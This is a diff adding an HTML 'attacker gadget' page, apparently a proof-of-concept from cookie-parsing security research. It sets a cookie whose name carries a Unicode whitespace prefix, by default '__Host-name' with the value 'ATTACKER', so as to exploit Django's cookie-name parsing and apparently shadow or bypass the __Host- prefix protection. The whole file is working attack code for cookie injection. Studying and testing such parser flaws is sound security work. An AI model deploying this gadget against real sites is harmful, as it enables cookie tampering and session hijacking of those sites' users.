@@ -1,0 +1,28 @@
+<html>
+  <body>
+    <h3>Attacker Gadget (Django parsing)</h3>
+    <p>Set a cookie with a Unicode whitespace prefix in the name and Domain/Path.</p>
+    <form onsubmit="return inject();">
+      <label>Unicode code point (hex): <input id="cp" value="2000"></label><br/>
+      <label>Cookie name: <input id="name" value="__Host-name"></label><br/>
+      <label>Domain: <input id="dom" value="localhost"></label><br/>
+      <label>Value: <input id="val" value="ATTACKER"></label><br/>
+      <button type="submit">Set Cookie</button>
+    </form>
+    <pre id="out"></pre>
+    <script>
+      function inject() {
+        const hex = document.getElementById('cp').value.trim();
+        const name = document.getElementById('name').value.trim();
+        const domain = document.getElementById('dom').value.trim();
+        const value = document.getElementById('val').value;
+        const prefix = String.fromCodePoint(parseInt(hex, 16));
+        document.cookie = `${prefix}${name}=${encodeURIComponent(value)}; Domain=${domain}; Path=/`;
+        document.getElementById('out').textContent = 'document.cookie now:\n' + document.cookie;
+        return false;
+      }
+    </script>
+  </body>
+</html>
+
+
